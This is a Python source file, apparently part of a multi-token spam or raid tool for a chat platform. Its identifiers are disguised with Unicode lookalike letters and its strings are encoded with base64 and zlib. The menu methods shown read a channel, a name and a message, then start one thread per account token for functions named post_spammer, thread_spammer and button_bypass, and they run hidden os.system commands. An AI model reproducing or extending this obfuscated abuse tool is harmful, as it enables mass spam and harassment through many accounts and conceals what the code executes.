    @𝘄𝗿𝘢𝘱𝘱𝙚𝗿
    def button_click(self):
        𝘰𝘀.system(__𝙞𝙢𝗽𝘰𝘳𝙩__(𝘭𝙈𝘐𝙄𝗠𝙡𝗠𝘕𝙄𝙄𝗡𝗠𝘭𝙡𝘐𝙈𝘭𝙈𝗹𝙄𝙈𝘐𝗠𝗜𝗡𝘔𝘐𝘭𝙡𝙡𝙉𝘭[𝘳𝙤𝙪𝗻𝘥(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝗼𝙧𝙩__(𝙡𝙈𝙄𝙄𝘔𝘭𝙈𝙉𝘐𝗜𝗡𝙈𝗹𝗹𝘐𝘔𝘭𝙈𝗹𝘐𝙈𝙄𝙈𝙄𝗡𝘔𝙄𝙡𝙡𝗹𝗡𝙡[𝙧𝙤𝙪𝘯𝗱(𝙖𝗯𝘀(0.2653623850834641 + 0.9641487460878717j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\x01\x00-\xdf\x05\x93')).decode())
        𝘮𝘦𝘀𝘴𝗮𝗴𝗲𝗹𝗶𝙣𝘬 = 𝙞𝗻𝙥𝘂𝘁(__𝗶𝙢𝘱𝘰𝘳𝘁__(𝙡𝙈𝗜𝙄𝘔𝙡𝘔𝘕𝘐𝗜𝗡𝘔𝗹𝙡𝙄𝗠𝗹𝗠𝘭𝗜𝗠𝙄𝙈𝙄𝘕𝘔𝙄𝙡𝘭𝘭𝗡𝙡[𝗿𝘰𝘂𝗻𝗱(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝙤𝗿𝙩__(𝙡𝗠𝘐𝙄𝘔𝘭𝙈𝘕𝙄𝘐𝗡𝙈𝗹𝗹𝘐𝗠𝘭𝘔𝙡𝘐𝙈𝙄𝙈𝗜𝙉𝗠𝗜𝘭𝘭𝘭𝗡𝙡[𝘳𝘰𝘶𝙣𝙙(𝘢𝘣𝘴(0.06980125112700108 + 0.9975609181103204j))]).decompress(b'x\xdaK56LJ56\xf4\x8b\x8a\xf0\xab\x8a\x0cO\xc9\xf1t\xad(H\xca-1O\x0b3H7\xc9O\x0c\xf6t\xb4\xb5\x05\x00\xdb\xe7\x0b\xdb')).decode().format(𝙧, 𝙡𝗰, 𝙧))
        𝗽𝘳𝙞𝙣𝙩(__𝗶𝙢𝘱𝘰𝙧𝘵__(𝗹𝗠𝙄𝙄𝗠𝗹𝘔𝗡𝙄𝗜𝙉𝙈𝘭𝘭𝗜𝘔𝘭𝙈𝘭𝗜𝘔𝘐𝙈𝘐𝘕𝗠𝙄𝙡𝙡𝙡𝙉𝗹[𝘳𝗼𝘂𝙣𝘥(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝗼𝗿𝘵__(𝗹𝗠𝙄𝗜𝗠𝗹𝗠𝗡𝙄𝙄𝙉𝙈𝗹𝗹𝗜𝘔𝗹𝘔𝙡𝙄𝙈𝙄𝗠𝘐𝘕𝙈𝙄𝙡𝗹𝙡𝗡𝗹[𝗿𝘰𝙪𝙣𝗱(𝗮𝙗𝘴(0.7151568816515268 + 0.6989639723379626j))]).decompress(b'x\xdaK56\xf4\x8a\xcat2Ht\x0f\xab\x8c\nN\xa9\xf2tqM\x8f\xcc\x0b3Hq\xb7,\xf5qv2H\x8dp\xca\xf1\xcft\xccO56(\x07\xe2\x02\xa0X\x01P\xbdi\x92qhz\x8a\x91[i\nPMR\xa5SV\x92{NVb\xa5SUT\xb8_YRn \xdc\x0cO\xf7\x02\xc3d\xe3\xc0\xf4\x14\x8f\x9c\xf2\xa8`\xc7\nOw\xcbJOw\xc3\xb2\xe4\xdc\xd0R\x00\xed\x13)p')).decode().format(𝙧, 𝙡𝘤, 𝘳))
        𝘣𝘂𝘵𝘁𝙤𝘯𝗼𝗽𝙩𝙞𝗼𝙣 = 𝗶𝙣𝘱𝘂𝙩(__𝘪𝗺𝘱𝘰𝙧𝙩__(𝗹𝙈𝘐𝙄𝙈𝘭𝘔𝗡𝗜𝗜𝗡𝗠𝗹𝗹𝘐𝘔𝘭𝙈𝗹𝗜𝘔𝗜𝘔𝗜𝙉𝘔𝙄𝘭𝙡𝗹𝗡𝙡[𝘳𝘰𝘂𝘯𝙙(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝗼𝘳𝘁__(𝘭𝗠𝗜𝗜𝗠𝙡𝘔𝗡𝘐𝙄𝙉𝙈𝘭𝘭𝗜𝙈𝘭𝘔𝘭𝗜𝙈𝙄𝘔𝗜𝘕𝗠𝙄𝗹𝘭𝙡𝘕𝗹[𝘳𝘰𝘂𝘯𝙙(𝘢𝗯𝙨(0.46572049010079175 + 0.8849318759657595j))]).decompress(b'x\xdaK56LJ56tN\x89\x082H22I\x0f1v2H\x0c\xb7,\x05\x8a\xa5x\xfa{\xbbgg:\xda\x02\x00\xc2h\n\xad')).decode().format(𝘳, 𝗹𝙘, 𝘳))
        𝙤𝘀.system(__𝘪𝘮𝗽𝗼𝘳𝙩__(𝘭𝗠𝗜𝘐𝗠𝘭𝘔𝙉𝘐𝘐𝘕𝘔𝘭𝙡𝘐𝘔𝙡𝗠𝙡𝘐𝘔𝗜𝗠𝘐𝘕𝘔𝘐𝙡𝙡𝗹𝙉𝗹[𝗿𝗼𝘶𝗻𝗱(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝙤𝙧𝘵__(𝗹𝘔𝙄𝘐𝙈𝘭𝗠𝗡𝙄𝗜𝘕𝙈𝗹𝙡𝗜𝙈𝙡𝘔𝘭𝘐𝙈𝘐𝗠𝘐𝗡𝘔𝘐𝘭𝙡𝘭𝗡𝙡[𝙧𝘰𝙪𝙣𝙙(𝙖𝘣𝘀(0.03252129379355306 + 0.9994710428271514j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝘱𝗿𝘪𝙣𝘵(𝗺𝗲𝙣𝘂)
        for 𝘁𝘰𝘬𝙚𝗻 in 𝙩𝙤𝗸𝙚𝙣𝙨:
            𝘵𝗵𝙧𝗲𝘢𝙙𝙞𝘯𝗴.Thread(target=𝙗𝘂𝙩𝙩𝘰𝘯_𝙗𝘆𝗽𝙖𝘴𝘀, args=(𝘵𝙤𝘬𝗲𝙣, 𝘮𝙚𝘀𝘀𝗮𝗴𝗲𝘭𝙞𝙣𝙠, 𝙗𝘶𝙩𝙩𝘰𝘯𝘰𝙥𝙩𝘪𝙤𝗻)).start()
        𝘦𝙭𝙞𝙩 = 𝗶𝙣𝙥𝘂𝘵(__𝙞𝘮𝗽𝗼𝗿𝘵__(𝘭𝗠𝘐𝙄𝘔𝘭𝗠𝘕𝗜𝘐𝗡𝙈𝙡𝙡𝘐𝘔𝙡𝘔𝘭𝙄𝗠𝙄𝙈𝘐𝘕𝙈𝘐𝙡𝘭𝗹𝗡𝘭[𝘳𝘰𝘂𝘯𝘥(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝙤𝙧𝙩__(𝗹𝘔𝗜𝗜𝙈𝗹𝗠𝙉𝗜𝙄𝙉𝘔𝗹𝗹𝗜𝗠𝘭𝙈𝙡𝙄𝙈𝙄𝗠𝙄𝗡𝙈𝘐𝗹𝘭𝗹𝘕𝙡[𝙧𝘰𝙪𝘯𝗱(𝗮𝗯𝘴(0.7142364132741662 + 0.6999045263128783j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        𝗲𝘅𝙞𝙩 = 𝘔𝘦𝘯𝘶().main_menu()
        𝗲𝘹𝗶𝘁()

    @𝘸𝗿𝘢𝗽𝙥𝙚𝙧
    def forms(self):
        𝙤𝘴.system(__𝗶𝙢𝙥𝘰𝙧𝘁__(𝙡𝘔𝘐𝙄𝙈𝙡𝘔𝗡𝙄𝗜𝘕𝗠𝘭𝙡𝙄𝘔𝗹𝙈𝘭𝙄𝙈𝗜𝘔𝙄𝘕𝙈𝙄𝙡𝙡𝙡𝙉𝙡[𝘳𝙤𝘶𝙣𝘥(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝙤𝘳𝙩__(𝘭𝘔𝘐𝘐𝘔𝙡𝗠𝘕𝘐𝘐𝙉𝗠𝗹𝙡𝗜𝗠𝗹𝘔𝙡𝘐𝗠𝙄𝘔𝘐𝙉𝙈𝙄𝗹𝘭𝙡𝘕𝙡[𝙧𝘰𝘶𝙣𝙙(𝙖𝙗𝘴(0.7647373840056058 + 0.6443420935374801j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝘱𝙧𝙞𝗻𝘁(𝘮𝙚𝗻𝘂)
        𝙤𝘴.system(__𝘪𝘮𝙥𝙤𝙧𝙩__(𝗹𝙈𝗜𝘐𝗠𝙡𝘔𝘕𝘐𝙄𝗡𝗠𝘭𝙡𝙄𝘔𝗹𝙈𝘭𝗜𝗠𝙄𝙈𝘐𝘕𝘔𝘐𝙡𝘭𝘭𝗡𝗹[𝘳𝘰𝘂𝗻𝗱(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝘳𝘁__(𝗹𝙈𝘐𝗜𝙈𝙡𝗠𝘕𝘐𝗜𝙉𝙈𝙡𝘭𝙄𝙈𝘭𝘔𝘭𝗜𝗠𝘐𝙈𝗜𝘕𝘔𝙄𝙡𝙡𝗹𝘕𝙡[𝗿𝗼𝘶𝘯𝘥(𝗮𝙗𝘀(0.39445486778822747 + 0.918915315618459j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0f\xca\xb5\xacL\x8a\xf0M\x0f5v\xcaH\n7\xccIN\xb7\xb5\x05\x00\x14\xfd\ra')).decode())
        𝘤𝙝𝙖𝘯𝙣𝙚𝗹 = 𝙛𝘄𝙊𝘒𝙙𝙜𝗟𝗳𝗦𝘜𝙇𝗸𝙘𝗚𝗠𝘗𝘎𝘽𝘮𝘙𝗼𝗭𝗟𝘏𝘥𝘦𝘡3𝙭1𝘀𝙔.mro()[8](𝘪𝙣𝙥𝘂𝘁(__𝘪𝙢𝗽𝗼𝘳𝘁__(𝗹𝗠𝘐𝘐𝗠𝙡𝙈𝗡𝙄𝘐𝗡𝘔𝙡𝘭𝗜𝘔𝙡𝙈𝗹𝘐𝙈𝙄𝗠𝘐𝘕𝙈𝗜𝙡𝗹𝙡𝗡𝙡[𝘳𝘰𝙪𝙣𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝙤𝘳𝙩__(𝗹𝘔𝗜𝘐𝙈𝘭𝗠𝙉𝗜𝘐𝘕𝗠𝙡𝙡𝘐𝘔𝗹𝘔𝙡𝗜𝙈𝘐𝙈𝙄𝗡𝘔𝗜𝗹𝘭𝘭𝙉𝗹[𝘳𝘰𝙪𝘯𝙙(𝘢𝗯𝘴(0.5062973945939002 + 0.8623589439597809j))]).decompress(b'x\xdaK56LJ56tItw+M\xca\r+\xf6t\xcdq\x05\xf2S<\xfd\xbd\xdd\xb33\x1dm\x01\xa5\xef\n\x1c')).decode().format(𝙧, 𝘭𝙘, 𝗿)))
        if 𝙘𝗵𝗮𝙣𝗻𝘦𝙡 == __𝙞𝗺𝙥𝙤𝗿𝘵__(𝗹𝘔𝗜𝘐𝗠𝘭𝘔𝘕𝘐𝗜𝘕𝘔𝙡𝗹𝙄𝗠𝗹𝘔𝗹𝗜𝘔𝗜𝗠𝗜𝘕𝘔𝗜𝗹𝙡𝗹𝙉𝙡[𝙧𝗼𝙪𝙣𝙙(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝙤𝗿𝘁__(𝗹𝙈𝙄𝘐𝗠𝙡𝗠𝘕𝙄𝙄𝗡𝘔𝗹𝘭𝘐𝘔𝙡𝙈𝗹𝙄𝙈𝙄𝘔𝗜𝗡𝗠𝗜𝘭𝙡𝘭𝗡𝙡[𝙧𝘰𝘶𝗻𝘥(𝗮𝙗𝘀(0.19091368561492172 + 0.9816068279331226j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝙈𝗲𝘯𝙪().main_menu()
        𝘯𝘢𝙢𝙚 = 𝘪𝘯𝘱𝘂𝘵(__𝙞𝗺𝗽𝗼𝗿𝘁__(𝗹𝗠𝙄𝗜𝘔𝗹𝙈𝙉𝘐𝘐𝘕𝗠𝗹𝗹𝘐𝗠𝗹𝙈𝙡𝘐𝗠𝗜𝘔𝘐𝘕𝙈𝘐𝘭𝙡𝗹𝘕𝗹[𝗿𝙤𝘂𝗻𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝗼𝗿𝘁__(𝗹𝙈𝘐𝙄𝗠𝗹𝗠𝙉𝙄𝘐𝗡𝙈𝙡𝙡𝘐𝗠𝗹𝗠𝘭𝘐𝘔𝗜𝙈𝘐𝗡𝙈𝘐𝙡𝙡𝘭𝘕𝘭[𝘳𝘰𝘶𝗻𝙙(𝗮𝗯𝘀(0.1986747993853064 + 0.980065469287235j))]).decompress(b'x\xdaK56LJ56\x0cM\xf4\xf0\xca\x89\x0c\x0fL\x0f\xc9u+\x89\x8a(\xb1\x8c\x08v\xc9\xcc(\xf0L\x07\x00\xaa\xaa\n\xcb')).decode().format(𝘳, 𝗹𝗰, 𝙧))
        if 𝗻𝙖𝙢𝙚 == __𝗶𝗺𝙥𝙤𝗿𝘁__(𝙡𝙈𝙄𝘐𝙈𝗹𝙈𝙉𝙄𝙄𝘕𝗠𝗹𝙡𝘐𝗠𝙡𝘔𝘭𝗜𝗠𝘐𝘔𝗜𝙉𝘔𝘐𝙡𝘭𝗹𝙉𝗹[𝗿𝗼𝘂𝗻𝗱(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝗿𝘁__(𝙡𝗠𝗜𝘐𝗠𝘭𝙈𝘕𝘐𝗜𝗡𝙈𝙡𝘭𝘐𝘔𝗹𝘔𝘭𝗜𝗠𝘐𝙈𝘐𝗡𝘔𝙄𝙡𝘭𝘭𝗡𝗹[𝙧𝙤𝙪𝘯𝗱(𝙖𝙗𝘀(0.8734084820310741 + 0.48698831969173023j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝙈𝙚𝗻𝘂().main_menu()
        𝘮𝙨𝘨 = 𝘪𝙣𝘱𝘶𝘁(__𝘪𝙢𝘱𝗼𝙧𝘵__(𝗹𝘔𝙄𝗜𝙈𝘭𝙈𝙉𝘐𝗜𝙉𝗠𝗹𝗹𝙄𝙈𝗹𝗠𝙡𝗜𝙈𝙄𝙈𝘐𝘕𝙈𝙄𝗹𝙡𝙡𝘕𝗹[𝗿𝘰𝘶𝙣𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝗼𝙧𝘁__(𝗹𝙈𝙄𝗜𝙈𝙡𝘔𝘕𝙄𝗜𝗡𝘔𝘭𝗹𝘐𝙈𝙡𝘔𝘭𝗜𝙈𝘐𝗠𝙄𝙉𝗠𝗜𝗹𝘭𝘭𝗡𝘭[𝗿𝘰𝙪𝙣𝗱(𝗮𝙗𝙨(0.596643645695084 + 0.8025062990728976j))]).decompress(b'x\xdaK56LJ56\xf4\x8b\x8a\xf0\xab\x8a\x0cO\xc9\x01\xb2S<\xfd\xbd\xdd\xb33\x1dm\x01\x80\x18\x08\xe6')).decode().format(𝘳, 𝘭𝘤, 𝘳))
        if 𝘮𝘀𝗴 == __𝙞𝙢𝙥𝙤𝘳𝙩__(𝙡𝗠𝗜𝘐𝙈𝘭𝗠𝗡𝙄𝙄𝙉𝘔𝗹𝗹𝗜𝙈𝙡𝗠𝗹𝘐𝗠𝘐𝙈𝙄𝗡𝘔𝙄𝗹𝙡𝗹𝙉𝙡[𝙧𝗼𝙪𝗻𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝗼𝗿𝘵__(𝙡𝙈𝙄𝘐𝙈𝙡𝙈𝙉𝗜𝗜𝘕𝙈𝘭𝙡𝙄𝘔𝘭𝘔𝘭𝗜𝗠𝘐𝗠𝙄𝗡𝙈𝙄𝙡𝘭𝗹𝙉𝘭[𝘳𝗼𝘶𝗻𝙙(𝘢𝗯𝙨(0.20015958625080954 + 0.9797633081677966j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝗠𝙚𝙣𝙪().main_menu()
        𝙤𝘀.system(__𝗶𝘮𝘱𝗼𝗿𝙩__(𝗹𝘔𝙄𝙄𝗠𝙡𝙈𝗡𝙄𝘐𝙉𝗠𝙡𝗹𝘐𝘔𝙡𝗠𝘭𝙄𝘔𝙄𝙈𝙄𝘕𝙈𝙄𝘭𝙡𝘭𝙉𝗹[𝙧𝘰𝙪𝘯𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝗿𝙩__(𝙡𝘔𝗜𝗜𝗠𝙡𝙈𝘕𝗜𝙄𝘕𝗠𝗹𝘭𝙄𝘔𝙡𝗠𝗹𝗜𝗠𝗜𝙈𝙄𝗡𝗠𝗜𝙡𝘭𝙡𝙉𝘭[𝘳𝙤𝙪𝘯𝘥(𝘢𝘣𝙨(0.34095572282896325 + 0.9400793557302379j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝗽𝙧𝗶𝗻𝘵(𝗺𝘦𝗻𝘂)
        for 𝘵𝗼𝗸𝘦𝘯 in 𝙩𝘰𝙠𝘦𝙣𝙨:
            𝘵𝗵𝗿𝘦𝙖𝙙𝗶𝙣𝘨.Thread(target=𝘱𝘰𝙨𝘁_𝙨𝙥𝘢𝘮𝗺𝙚𝘳, args=(𝘵𝗼𝘬𝙚𝘯, 𝘤𝗵𝘢𝘯𝙣𝗲𝙡, 𝘯𝗮𝗺𝙚, 𝗺𝘀𝙜)).start()
        𝘦𝘅𝘪𝙩 = 𝘪𝘯𝗽𝘂𝘵(__𝘪𝙢𝙥𝘰𝙧𝘵__(𝗹𝘔𝗜𝘐𝙈𝘭𝙈𝘕𝙄𝙄𝘕𝗠𝘭𝘭𝗜𝘔𝘭𝙈𝗹𝙄𝘔𝘐𝘔𝗜𝗡𝘔𝗜𝙡𝗹𝘭𝗡𝘭[𝙧𝗼𝙪𝙣𝘥(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝘳𝙩__(𝘭𝘔𝘐𝙄𝗠𝘭𝙈𝗡𝘐𝙄𝙉𝘔𝘭𝗹𝙄𝘔𝗹𝙈𝗹𝗜𝘔𝙄𝙈𝗜𝗡𝗠𝗜𝘭𝙡𝗹𝙉𝘭[𝗿𝗼𝘶𝙣𝘥(𝘢𝗯𝙨(0.477316082606715 + 0.8787316753622687j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        𝙚𝙭𝗶𝘁 = 𝙈𝗲𝗻𝙪().main_menu()
        𝗲𝙭𝙞𝙩()

    @𝘄𝘳𝘢𝗽𝙥𝘦𝘳
    def thread(self):
        𝘰𝘀.system(__𝙞𝘮𝙥𝙤𝘳𝘁__(𝘭𝘔𝗜𝘐𝘔𝙡𝘔𝗡𝗜𝘐𝘕𝙈𝙡𝗹𝗜𝘔𝘭𝘔𝘭𝙄𝘔𝗜𝗠𝗜𝘕𝙈𝘐𝘭𝙡𝘭𝙉𝙡[𝙧𝙤𝙪𝙣𝘥(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝗿𝘵__(𝘭𝗠𝗜𝙄𝙈𝗹𝙈𝘕𝗜𝗜𝙉𝙈𝙡𝘭𝗜𝘔𝗹𝗠𝗹𝘐𝘔𝙄𝗠𝘐𝙉𝙈𝙄𝗹𝘭𝙡𝘕𝙡[𝗿𝙤𝘂𝙣𝘥(𝙖𝗯𝘴(0.7618990030135158 + 0.6476958462171969j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝘱𝘳𝗶𝙣𝙩(𝘮𝘦𝙣𝘶)
        𝙤𝘀.system(__𝗶𝘮𝗽𝙤𝘳𝙩__(𝗹𝗠𝘐𝗜𝘔𝘭𝗠𝘕𝗜𝗜𝙉𝗠𝘭𝘭𝙄𝗠𝙡𝘔𝘭𝘐𝙈𝗜𝙈𝙄𝙉𝗠𝙄𝘭𝙡𝙡𝘕𝙡[𝘳𝘰𝙪𝘯𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝘰𝙧𝙩__(𝗹𝗠𝗜𝗜𝘔𝘭𝘔𝘕𝗜𝘐𝗡𝗠𝙡𝘭𝗜𝙈𝗹𝙈𝙡𝘐𝗠𝗜𝙈𝘐𝘕𝘔𝙄𝘭𝘭𝙡𝘕𝘭[𝙧𝙤𝘶𝙣𝗱(𝙖𝙗𝘴(0.7950835308009364 + 0.606499941507925j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0fs\xcf\xa8\x8c\nw\xcb\xf6\xf4\xf0+\x8f\x0c7,\x89\x8a\xf0\xb4\x05\x00\x16\t\ry')).decode())
        𝗻𝘢𝘮𝙚 = 𝙞𝗻𝗽𝘶𝘁(__𝗶𝙢𝙥𝗼𝘳𝘁__(𝗹𝘔𝗜𝘐𝗠𝙡𝙈𝗡𝙄𝗜𝙉𝘔𝙡𝗹𝘐𝙈𝙡𝘔𝘭𝘐𝗠𝘐𝗠𝘐𝙉𝘔𝘐𝘭𝙡𝗹𝗡𝗹[𝗿𝘰𝘂𝘯𝘥(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝙧𝘵__(𝙡𝗠𝘐𝗜𝗠𝗹𝘔𝙉𝙄𝘐𝗡𝗠𝙡𝙡𝙄𝙈𝙡𝙈𝘭𝘐𝙈𝘐𝙈𝙄𝘕𝗠𝘐𝘭𝗹𝙡𝙉𝗹[𝗿𝘰𝘶𝗻𝙙(𝗮𝙗𝙨(0.057734711819448004 + 0.9983319603474213j))]).decompress(b'x\xdaK56LJ56\x0cM\xf4\xf0\xca\x89\x0c\x0fLO\xcau+\x89\x8a(\xb1\x8c\x08v\xc9\xcc(\xf0L\x07\x00\xab\x8a\n\xd9')).decode().format(𝗿, 𝘭𝗰, 𝙧))
        if 𝙣𝘢𝗺𝘦 == __𝗶𝘮𝗽𝙤𝘳𝙩__(𝗹𝘔𝘐𝗜𝘔𝗹𝘔𝘕𝘐𝙄𝙉𝗠𝘭𝙡𝙄𝘔𝗹𝙈𝗹𝘐𝙈𝙄𝙈𝗜𝙉𝗠𝙄𝙡𝘭𝗹𝙉𝘭[𝘳𝗼𝙪𝗻𝗱(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝗼𝗿𝙩__(𝙡𝙈𝘐𝙄𝗠𝗹𝘔𝘕𝙄𝗜𝗡𝘔𝘭𝗹𝙄𝙈𝙡𝗠𝗹𝗜𝗠𝙄𝘔𝘐𝙉𝙈𝗜𝗹𝗹𝙡𝙉𝙡[𝙧𝘰𝘶𝘯𝗱(𝙖𝘣𝘀(0.015293303677976433 + 0.9998830505927246j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝗠𝘦𝙣𝘶().main_menu()
        𝘤𝘩𝘢𝗻𝗻𝘦𝘭 = 𝘪𝘜𝘵𝘁𝗵𝙩𝙤𝙬𝘮7𝘉𝙛3𝙝𝗤7𝘉𝙉96𝘱3𝘖𝙤𝘱𝙜𝗠𝘼𝘾𝙁𝙩8.mro()[5](𝗶𝙣𝙥𝙪𝘁(__𝗶𝘮𝘱𝗼𝙧𝙩__(𝗹𝘔𝘐𝗜𝙈𝗹𝗠𝗡𝘐𝗜𝗡𝗠𝘭𝘭𝗜𝗠𝘭𝙈𝙡𝙄𝘔𝘐𝘔𝘐𝙉𝘔𝙄𝙡𝘭𝙡𝗡𝙡[𝗿𝘰𝘶𝙣𝙙(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝙤𝗿𝘁__(𝙡𝙈𝗜𝘐𝙈𝗹𝘔𝗡𝘐𝙄𝘕𝘔𝙡𝘭𝗜𝙈𝗹𝘔𝘭𝙄𝗠𝗜𝘔𝙄𝙉𝘔𝙄𝘭𝘭𝗹𝘕𝙡[𝘳𝗼𝘶𝗻𝘥(𝘢𝗯𝙨(0.5887626939895865 + 0.8083059384701591j))]).decompress(b'x\xdaK56LJ56tItw+M\xca\r+\xf6t\xcdq\x05\xf2S<\xfd\xbd\xdd\xb33\x1dm\x01\xa5\xef\n\x1c')).decode().format(𝗿, 𝘭𝘤, 𝙧)))
        if 𝗰𝘩𝘢𝙣𝗻𝗲𝙡 == __𝘪𝘮𝙥𝗼𝙧𝘵__(𝙡𝘔𝗜𝙄𝙈𝘭𝗠𝘕𝙄𝗜𝙉𝙈𝙡𝙡𝘐𝗠𝘭𝙈𝗹𝘐𝘔𝘐𝙈𝙄𝗡𝘔𝙄𝗹𝗹𝙡𝘕𝗹[𝙧𝙤𝘶𝘯𝗱(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝗿𝘵__(𝙡𝙈𝗜𝗜𝙈𝗹𝘔𝘕𝗜𝗜𝘕𝗠𝗹𝘭𝘐𝘔𝗹𝗠𝘭𝙄𝘔𝗜𝘔𝗜𝗡𝙈𝘐𝙡𝗹𝙡𝗡𝗹[𝙧𝘰𝘶𝘯𝙙(𝙖𝗯𝙨(0.40411036346799745 + 0.9147102350677853j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝗠𝗲𝘯𝙪().main_menu()
        𝗼𝙨.system(__𝘪𝘮𝘱𝙤𝗿𝘵__(𝙡𝙈𝗜𝘐𝗠𝗹𝗠𝗡𝘐𝙄𝘕𝗠𝘭𝙡𝗜𝙈𝘭𝘔𝘭𝙄𝙈𝗜𝙈𝘐𝘕𝘔𝘐𝘭𝗹𝗹𝘕𝙡[𝗿𝙤𝙪𝗻𝗱(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝗼𝗿𝘵__(𝘭𝙈𝗜𝙄𝙈𝙡𝗠𝙉𝙄𝗜𝙉𝗠𝗹𝙡𝙄𝘔𝙡𝙈𝗹𝙄𝙈𝘐𝘔𝙄𝘕𝘔𝗜𝙡𝙡𝗹𝗡𝘭[𝗿𝘰𝙪𝗻𝘥(𝗮𝘣𝙨(0.693536178116801 + 0.720421799811153j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝙥𝙧𝙞𝘯𝘵(𝙢𝙚𝘯𝘂)
        for 𝘁𝙤𝙠𝘦𝗻 in 𝙩𝙤𝙠𝗲𝗻𝘀:
            𝘵𝗵𝙧𝘦𝗮𝘥𝙞𝗻𝙜.Thread(target=𝘵𝙝𝗿𝗲𝗮𝘥_𝙨𝙥𝗮𝘮𝙢𝙚𝙧, args=(𝘁𝘰𝗸𝗲𝙣, 𝘯𝘢𝙢𝙚, 𝙘𝙝𝗮𝙣𝙣𝗲𝗹)).start()
        𝗲𝙭𝗶𝙩 = 𝗶𝗻𝙥𝙪𝘵(__𝙞𝘮𝗽𝘰𝘳𝘵__(𝗹𝗠𝙄𝗜𝙈𝙡𝙈𝙉𝘐𝙄𝘕𝙈𝙡𝙡𝙄𝙈𝗹𝘔𝘭𝙄𝙈𝙄𝙈𝘐𝙉𝘔𝙄𝙡𝘭𝘭𝗡𝙡[𝙧𝘰𝙪𝙣𝗱(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝗼𝙧𝘁__(𝘭𝗠𝗜𝗜𝗠𝗹𝙈𝘕𝗜𝙄𝘕𝗠𝗹𝘭𝗜𝗠𝘭𝗠𝘭𝘐𝗠𝘐𝘔𝘐𝙉𝘔𝗜𝙡𝗹𝗹𝗡𝗹[𝗿𝙤𝘂𝘯𝗱(𝙖𝙗𝘀(0.7473596205503674 + 0.6644197450187727j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        𝙚𝙭𝙞𝙩 = 𝗠𝙚𝘯𝘂().main_menu()
        𝘦𝘅𝘪𝙩()

    @𝙬𝙧𝙖𝘱𝘱𝙚𝘳
    def Nick(self):
        𝙤𝙨.system(__𝘪𝗺𝙥𝗼𝙧𝘁__(𝗹𝙈𝘐𝗜𝘔𝗹𝗠𝗡𝙄𝙄𝘕𝙈𝘭𝗹𝗜𝗠𝘭𝙈𝙡𝘐𝙈𝗜𝙈𝙄𝘕𝗠𝗜𝙡𝘭𝙡𝙉𝙡[𝗿𝙤𝙪𝙣𝗱(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝗼𝙧𝘁__(𝘭𝘔𝙄𝗜𝗠𝘭𝘔𝙉𝘐𝗜𝙉𝗠𝗹𝙡𝗜𝙈𝘭𝗠𝙡𝘐𝘔𝙄𝗠𝙄𝗡𝗠𝗜𝘭𝙡𝘭𝙉𝘭[𝙧𝙤𝘂𝗻𝗱(𝗮𝗯𝘀(0.1789487066521367 + 0.9838584046434362j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0f\xc9\xcd\xc9J42\xcdH\n\x0fM\x0f4\xca\xc8H\xcaM\xc9IN\xb7\xb5\x05\x00RJ\x0f(')).decode())
